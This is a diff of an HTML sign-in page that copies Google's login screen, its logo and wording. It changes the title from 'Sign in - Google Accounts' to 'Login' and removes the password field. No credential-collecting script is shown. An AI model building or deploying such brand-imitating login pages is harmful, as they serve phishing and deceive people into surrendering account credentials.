@@ -1,43 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-    <link rel="stylesheet" href="styles2.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <link rel="stylesheet" href="styles2.css">
+  <script defer src="script.js"></script>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
-        </div>
-        <div class="login-box" id="loginBox">
-            <h1>Sign in</h1>
-            <p class="subtitle">to continue to Gmail</p>
-            <form id="loginForm">
-                <!-- Email input section -->
-                <div class="input-group" id="emailGroup">
-                    <input type="email" id="email" name="email" required>
-                    <label for="email">Email or phone</label>
-                </div>
-                <p class="forgot-email"><a href="#">Forgot email?</a></p>
-
-                <!-- Password input section (hidden initially) -->
-                <div class="input-group" id="passwordGroup" style="display: none;">
-                    <input type="password" id="password" name="password" required>
-                    <label for="password">Enter your password</label>
-                </div>
-
-                <div class="footer">
-                    <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
-                </div>
-                <div class="buttons">
-                    <a href="#" class="create-account">Create account</a>
-                    <button type="button" class="next" id="nextButton">Next</button>
-                </div>
-            </form>
-        </div>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
     </div>
-    <script type="module" src="script.js"></script>
+    <div class="login-box">
+      <h1>Sign in</h1>
+      <p class="subtitle">to continue to your application</p>
+      <div class="input-group">
+        <input type="text" id="email" placeholder=" " required>
+        <label for="email">Email or phone</label>
+      </div>
+      <p class="forgot-email"><a href="#">Forgot email?</a></p>
+      <div class="buttons">
+        <a href="#" class="create-account">Create account</a>
+        <button class="next" id="nextBtn">Next</button>
+      </div>
+    </div>
+    <div class="footer">
+      <p>Not your computer? Use Guest mode to sign in privately.</p>
+      <p><a href="#">Learn more</a></p>
+    </div>
+  </div>
 </body>
 </html>
+
